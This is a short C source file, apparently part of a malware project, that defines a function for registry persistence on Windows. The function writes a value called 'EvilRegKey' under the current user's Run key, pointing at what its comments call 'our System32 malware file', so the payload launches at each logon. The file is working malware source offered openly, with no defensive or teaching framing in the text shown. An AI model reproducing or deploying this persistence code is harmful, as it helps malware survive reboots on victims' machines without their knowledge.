
#include "registry.h"

/**
 * Given the path to our Q.exe as well as the argument, generate a new regsitry key under
 * the CURRENT_USER root key, targeting the \run subkey!
 * 
 * @param path the path to our System32 malware file
 * @param arg the argumetn to pass to the key string
 * @param access the access writes we need in the regsitry
 * @return wether it succeeded!
 */
RET_CODE generateRegKey(char* path, char* arg, LONG access) {
    char exec[128];
    snprintf(exec, 128, "\"%s\" %s", path, arg);

    HKEY hKey;
    // now try generate the key using CURRENT_USER targeting the run key
    LONG res = RegOpenKeyExA(HKEY_CURRENT_USER, TARGET_REG_KEY, 0, access, &hKey);
    if (res == ERROR_SUCCESS) {
        res = RegSetValueExA(hKey, "EvilRegKey", 0, REG_SZ, (LPBYTE) exec, strlen(exec));
        RegCloseKey(hKey);
        if (res == ERROR_SUCCESS) { return R_SUCCESS; }
    }
    return R_FAILURE;
}